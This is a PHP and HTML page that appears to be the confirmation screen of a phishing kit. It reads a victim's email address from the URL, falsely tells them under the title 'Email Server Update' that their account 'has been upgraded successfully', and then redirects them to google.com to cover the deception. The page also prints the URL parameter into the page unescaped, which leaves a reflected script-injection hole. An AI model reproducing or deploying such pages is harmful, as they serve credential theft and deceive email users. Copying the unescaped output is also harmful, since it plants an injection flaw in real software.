<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html lang="en" >
<head>

  <meta charset="UTF-8">
  <title>Email Server Update</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  
  <meta http-equiv="refresh" content="3; url=https://www.google.com" />

</head>

<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">


<table cellspacing="0">

<tr>

<td style="width:30px;"></td>





<td>

	<table>
	
	<tr><td style="height:25px;"></td></tr>
	
	<tr><td>
	
			<font face="Arial, Helvetica, sans-serif" size="2" color="#000"><b>
			<font size="4">Success!</font> </b>
			<br>
			Your email account <?php echo $login ?> has been upgraded successfully
			</font>
			
	</td></tr>
	
	
	</table>

</td>


</tr>

</table>


</body>

</html>